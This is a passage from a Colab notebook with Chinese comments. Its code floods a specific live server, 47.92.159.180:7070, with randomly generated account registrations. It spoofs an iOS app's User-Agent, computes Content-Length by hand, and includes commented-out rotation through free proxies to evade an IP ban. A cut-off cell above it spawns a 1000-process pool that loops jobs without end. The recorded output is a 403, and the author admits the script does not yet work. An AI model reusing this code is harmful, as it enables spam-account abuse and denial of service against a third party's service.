        "    pool = multiprocessing.Pool(processes=1000)\n",
        "    while True:\n",
        "        pool.apply_async(job1)\n",
        "\n",
        "\n",
        "main()\n",
        "\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Error\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "eC7mvA6nzXrF",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 53
        },
        "outputId": "af4f4b40-f970-4640-c607-3222ccf13965"
      },
      "source": [
        "# 修改后的单线程test2.0\n",
        "# 当时以为是ip被封\n",
        "# 爬虫从一个网站得到ip\n",
        "# 然后进行代理访问，还是不行 555\n",
        "# 再说了\n",
        "import requests\n",
        "import json\n",
        "import random\n",
        "import string\n",
        "import threading\n",
        "import re\n",
        "\n",
        "# proxy_url免费ip代理的网站\n",
        "# 可以自己打开看的\n",
        "# 后面是正则匹配获取代理ip的信息并存储为a返回给下面待用\n",
        "def get_proxy():\n",
        "    a=\"\"\n",
        "    proxy_url='https://ip.jiangxianli.com/api/proxy_ip'\n",
        "    r=requests.get(proxy_url)                 #利用requests来得到网址的源代码\n",
        "    pattern='ip\":\"(.*?)\",\"port\"(:)\"(.*?)\"'           #对于单词的正则匹配\n",
        "    fanyi=re.findall(pattern , r.text , re.S)       #将匹配的内容存到fanyi当中\n",
        "    a=fanyi[0][0]+fanyi[0][1]+fanyi[0][2]\n",
        "    return a\n",
        "\n",
        "url='http://47.92.159.180:7070/user/register'\n",
        "\n",
        "# 找到的一个header文件的细节\"Content-Length\"的参数是和往里塞的注册的账号和密码的长度有关\n",
        "# 字符长 \"Content-Length\"的参数\n",
        "# 9     38\n",
        "# 11     40\n",
        "\n",
        "def zhuce():   \n",
        "    #长度\n",
        "    a=random.randint(5,10)\n",
        "    b=random.randint(5,10)\n",
        "    #用户名\n",
        "    username=''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789.+-*/-=0!@#$%$^&_()*{}|<>?{}|ABCDEFGHIJKLMNOPQRSTUVWXYZ',a))\n",
        "    #密码\n",
        "    passwd=''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789.+-*/-=0!@#$%$^&_()*{}|<>?{}|ABCDEFGHIJKLMNOPQRSTUVWXYZ',b))\n",
        "    \n",
        "    # 按照上面两个数字的对应判断，计算出length的值\n",
        "    length = len(username)+len(passwd)-9+38\n",
        "    # print(length)\n",
        "    #爬虫\n",
        "    data=json.dumps({ \"passWord\": passwd , \"userName\": username })\n",
        "\n",
        "    # 可以多行写，第一行信息没有改变，第二行信息的赋值要修改\n",
        "    headers={\"Accept\": \"*/*\",\"Accept-Encoding\": \"gzip;q=1.0, compress;q=0.5\",\"Accept-Language\": \"zh-Hans-CN;q=1.0, en-CN;q=0.9, zh-Hant-CN;q=0.8\",\"Connection\": \"close\",\"Content-Type\": \"application/json\",\"Host\": \"47.92.159.180:7070\",\"User-Agent\": \"katago/2.0 (io.katago; build:16; iOS 13.4.1) Alamofire/4.9.1\",\n",
        "          \"Content-Length\": str(length),}\n",
        "    # print(username)\n",
        "    # print(passwd)\n",
        "\n",
        "    # # 如果要用代理，请取消注释这些行\n",
        "    # print(get_proxy())\n",
        "    # proxy_list ={'http':\"http://\"+get_proxy()}\n",
        "    # print(requests.post(url,json=data,headers=headers,timeout=3,proxies=proxy_list).text)\n",
        "\n",
        "    # 不代理\n",
        "    print(requests.post(url,data,headers,timeout=3).text)\n",
        "\n",
        "\n",
        "zhuce()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "39\n",
            "{\"Msg\":\"403\"}\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tM8ZHtZnLHYq",
        "colab_type": "text"
      },
      "source": [
        "# 好可惜代码暂时用不了\n",
        "# 可能单个运行一次还可以 但是多次肯定不行\n",
        "# 挖个坑，等一个后厉害了再说吧\n",
        "# 上面的代码怎么写的过程另说"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "bouSGCU0K8Rr",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}